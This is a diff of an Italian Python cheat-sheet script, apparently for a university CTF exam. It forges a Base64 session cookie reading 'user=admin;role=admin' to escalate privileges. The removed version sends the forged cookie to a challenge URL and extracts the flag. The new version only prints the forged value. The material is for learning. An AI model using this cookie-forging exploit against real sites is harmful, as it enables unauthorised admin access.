@@ -1,66 +1,53 @@
 #!/usr/bin/env python3
 """
-PRONTUARIO #05: Web Cookie Tampering & Broken Auth Exploit
---------------------------------------------------------
-Modulo: Web Security / Broken Access Control
-Descrizione: Forgiatura di cookie di sessione (in chiaro o Base64)
-            per effettuare Privilege Escalation verso risorse protette.
+PRONTUARIO #05: Web Cookie Tampering & Broken Access Control
+------------------------------------------------------------
+Modulo: Web Security / Privilege Escalation
+Descrizione: Manipolazione e forgiatura di cookie di sessione lato client
+            (in chiaro o Base64) per analisi di Broken Access Control.
 """
 
-import requests
 import base64
 
 # ==================== INPUT DATI D'ESAME ====================
-TARGET_URL = "http://challenge.unipd.it:8080/admin"  # URL della risorsa protetta
-COOKIE_NAME = "auth_session"                          # Nome del cookie di sessione
+# Cookie originale restituito dal server (rilevato da DevTools)
+ORIGINAL_COOKIE = "dXNlcj1ndWVzdDtyb2xlPWd1ZXN0"
 
-# PAYLOAD PER PRIVILEGE ESCALATION
-# Caso A: Stringa in chiaro da forgiare (es. "user=admin;role=admin")
+# Stringa dei privilegi da forgiare
 RAW_PAYLOAD = "user=admin;role=admin"
 
-# Caso B: Se il cookie richiede la codifica in Base64
+# Impostare True se il cookie impiega la codifica Base64
 USE_BASE64 = True
 # ============================================================
 
 
-def craft_cookie_value(payload: str, encode_b64: bool) -> str:
-    """Prepara il valore del cookie eventualmente applicando la codifica Base64."""
-    if encode_b64:
-        # Convertiamo la stringa in byte, poi in Base64 e infine di nuovo in stringa
+def decode_cookie(cookie_val: str, is_b64: bool) -> str:
+    """Decodifica il valore del cookie da Base64 o restituisce la stringa in chiaro."""
+    if is_b64:
+        return base64.b64decode(cookie_val.encode('utf-8')).decode('utf-8', errors='ignore')
+    return cookie_val
+
+
+def encode_cookie(payload: str, is_b64: bool) -> str:
+    """Ricodifica il payload in Base64 o restituisce la stringa originale."""
+    if is_b64:
         return base64.b64encode(payload.encode('utf-8')).decode('utf-8')
     return payload
 
 
 def main():
-    print(f"[*] Avvio Exploit Cookie Tampering su Target: {TARGET_URL}")
+    print("=== ANALYSIS & COOKIE TAMPERING TOOL ===")
+    print(f"[*] Cookie Originale : {ORIGINAL_COOKIE}")
     
-    # 1. Preparazione del cookie alterato
-    forged_value = craft_cookie_value(RAW_PAYLOAD, USE_BASE64)
-    cookies_dict = {COOKIE_NAME: forged_value}
+    # 1. Decodifica e analisi dello stato originale
+    decoded_orig = decode_cookie(ORIGINAL_COOKIE, USE_BASE64)
+    print(f"[*] Decodifica Stato : '{decoded_orig}'")
     
-    print(f"[*] Cookie Forgiato: {COOKIE_NAME} = {forged_value}")
-    print("[*] Invio richiesta HTTP GET con le credenziali modificate...\n")
-
-    try:
-        # 2. Invio della richiesta HTTP con il cookie manipolato
-        response = requests.get(TARGET_URL, cookies=cookies_dict, timeout=5)
-        
-        # 3. Analisi della risposta
-        print(f"[+] Codice Risposta HTTP: {response.status_code}")
-        
-        if "flag{" in response.text:
-            print("\n=== PRIVILEGE ESCALATION RIUSCITA! ===")
-            # Estraiamo la flag dalla risposta HTML/Text
-            start_idx = response.text.find("flag{")
-            end_idx = response.text.find("}", start_idx) + 1
-            print(f" Flag Trovata: {response.text[start_idx:end_idx]}")
-            print("=====================================")
-        else:
-            print("[!] Flag non trovata nell'HTML restituito. Controlla il contenuto della risposta:")
-            print(response.text[:500]) # Stampa i primi 500 caratteri dell'HTML
-
-    except Exception as e:
-        print(f"[!] Errore di connessione: {e}")
+    # 2. Forgiatura del nuovo stato con privilegi elevati
+    forged_cookie = encode_cookie(RAW_PAYLOAD, USE_BASE64)
+    print(f"\n[+] Payload Forgiato : '{RAW_PAYLOAD}'")
+    print(f"[+] Cookie Forgiato  : {forged_cookie}")
+    print("\n[*] Utilizzare il cookie forgiato nell'header HTTP 'Cookie:' della richiesta.")
 
 
 if __name__ == "__main__":
